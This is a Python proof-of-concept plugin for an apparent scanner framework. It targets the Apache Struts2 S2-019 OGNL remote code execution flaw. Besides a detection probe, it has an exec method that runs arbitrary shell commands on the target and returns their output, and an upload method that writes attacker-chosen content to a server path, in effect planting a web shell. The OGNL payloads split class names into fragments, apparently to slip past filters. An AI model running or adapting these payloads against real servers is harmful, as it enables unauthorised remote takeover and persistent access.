#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from script import Script, SERVICE_PORT_MAP

class POC(Script):
    '''
    S2_019 未验证
    '''
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'Struts2-019'
        self.keyword = ['struts2', 'java']
        self.info = 'Struts2-019'
        self.type = 'rce'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)

    def prove(self):
        self.get_url()
        if self.url != None:
            prove_poc = '''debug%3dcommand%26expression%3d%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27)%2c%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27)%2c%23resp.setCharacterEncoding(%27UTF-8%27)%2c%23resp.getWriter().print(%22struts2_se%22%2b%22curity_vul%22)%2c%23resp.getWriter().print(%22struts2%22+%22_security_vul_str2019%22)%2c%23resp.getWriter().flush()%2c%23resp.getWriter().close()'''
            poc_key = "struts2_security_vul"
            try:
                headers = {'Content-Type': "application/x-www-form-urlencoded"}
                res = self.curl('get', self.url, params=prove_poc, headers=headers)
                if poc_key in res.headers or poc_key in res.text:
                    self.flag = 1
                    self.req.append({"poc": prove_poc})
                    self.res.append({"info": self.url, "key": 'struts2_019'})
            except:
                pass


    def exec(self):
        self.get_url()
        if self.url != None:
            cmd = self.parameter['cmd']
            exec_poc =  '''debug=command&expression=#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),#resp.setCharacterEncoding('UTF-8'),#resp.getWriter().print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("%COMMAND%").getInputStream())),#resp.getWriter().flush(),#resp.getWriter().close()'''
            headers = {}
            try:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                res = self.curl('get', self.url, params=exec_poc.replace("%COMMAND%", cmd)).text
                self.flag = 1
                self.req.append({"poc": exec_poc})
                self.res.append({"info": res, "key": cmd})
            except:
                pass

    def upload(self):
        self.get_url()
        if self.url != None:
            upload_poc = '''debug=command&expression=#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),#res=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#res.getWriter().print("oko"),#res.getWriter().print("kok/"),#res.getWriter().print(#req.getContextPath()),#res.getWriter().flush(),#res.getWriter().close(),new java.io.BufferedWriter(new java.io.FileWriter(%PATH%)).append(#req.getParameter("shell")).close()&shell=%FILECONTENT%'''
            despath = self.parameter['despath']
            srcpath = self.parameter['srcpath']
            content = self.read_file(srcpath['srcpath'])
            headers = {}
            try:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                self.curl('get', self.url,params=upload_poc.replace("%PATH%", despath).replace("%FILECONTENT%", content),headers=headers)
                self.flag = 1
                self.req.append({"poc": upload_poc})
                self.res.append({"info":  despath ,"key":"upload"})
            except:
                pass

